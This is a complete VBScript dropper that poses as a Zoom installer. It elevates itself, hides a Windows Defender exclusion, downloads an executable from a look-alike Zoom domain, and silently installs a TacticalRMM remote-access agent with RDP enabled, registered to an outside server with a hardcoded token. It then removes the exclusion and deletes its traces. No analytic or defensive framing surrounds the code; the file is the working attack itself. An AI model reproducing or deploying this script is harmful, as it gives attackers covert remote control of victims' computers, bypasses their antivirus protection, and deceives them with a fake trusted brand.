If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
    WScript.Quit
End If

Dim oShell
Set oShell = CreateObject("WScript.Shell")

Dim strTemp
strTemp = oShell.ExpandEnvironmentStrings("%TEMP%") & "\ZoomInstaller.exe"

' Add Defender exclusion for temp folder
oShell.Run "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath $env:TEMP""", 0, True

' Download TacticalRMM agent
oShell.Run "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/ZoomInstaller.exe' -OutFile '" & strTemp & "' -UseBasicParsing""", 0, True

' Unblock file
oShell.Run "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command ""Unblock-File -Path '" & strTemp & "'""", 0, True

' Install silently
oShell.Run """" & strTemp & """ /VERYSILENT /SUPPRESSMSGBOXES", 0, True

' Wait for files to settle
WScript.Sleep 6000

' Register with server
oShell.Run """C:\Program Files\TacticalAgent\tacticalrmm.exe"" -m install --api https://api.cacgreatchallange.org --client-id 1 --site-id 1 --agent-type workstation --auth e88d652cb5e09ed94a4572bbe3ec29b4c0046d0c4ce67e9ae4712faaa8bf3e53 --rdp --ping", 0, True

' Remove exclusion after install
oShell.Run "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command ""Remove-MpPreference -ExclusionPath $env:TEMP""", 0, True

' Cleanup
oShell.Run "cmd /c del """ & strTemp & """", 0, True
